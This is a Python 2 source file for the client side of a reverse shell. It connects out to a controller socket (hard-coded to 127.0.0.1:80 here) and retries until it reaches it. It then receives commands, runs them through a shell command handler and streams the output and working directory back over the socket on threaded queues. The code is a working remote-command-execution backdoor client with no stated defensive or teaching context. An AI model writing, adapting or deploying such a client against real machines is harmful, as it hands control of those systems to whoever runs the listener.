import sys
import socket
import subprocess
import Queue
import os
import threading
import time
import shell_commands
from shell_config import * 

marker = chr(255)

def connect():
    global comm_socket
    comm_socket = socket.socket()
    comm_socket.connect(("127.0.0.1", 80))
    comm_socket.sendall("\n"+os.getcwd()+">"+marker)

while True:
    try:
        connect()
        print "worked"
        break
    except:
        print "Can't connect! Trying again in " + str(sleeptime) + " seconds..."
        time.sleep(sleeptime)


output_queue = Queue.Queue()

class MessageHandler:
	def __init__(self, data_prefix):
		self.data_prefix = data_prefix
		self.input_queue = Queue.Queue()
		
	def put(self, data):
		self.input_queue.put(data)
		
	def send(self, data):
		output_queue.put(self.data_prefix+data+marker)
		
	def run(self):
		pass
		
class UserInputHandler(MessageHandler):

	def run(self):
		while True:
			print "trying to get data!"
			data = self.input_queue.get()
			
			output = shell_commands.handle_command(data)
			output += "\n"+os.getcwd()+">> "
			self.send(output)
			
class TransmitHandler(MessageHandler): # Pseudo-handler to send data to shell
	def run(self):
		while True:
			comm_socket.sendall(output_queue.get())	
		
handlers = []
user_input_handler = UserInputHandler(chr(1))
transmit_handler = TransmitHandler(chr(0)) # Create handlers
handlers.append(user_input_handler)
handlers.append(transmit_handler)

for handler in handlers: # Start handlers
	t = threading.Thread(target=handler.run)
	t.daemon = True
	t.start()

while True:
	data = ""
	while not data.endswith(marker):
		data += comm_socket.recv(4096)
	if not data: break
	data = data[:-1] # Get data from shell and remove marker

	for handler in handlers:
		if handler.data_prefix == data[0]: # Put data on correct handler's queue
			handler.put(data[1:])
			break
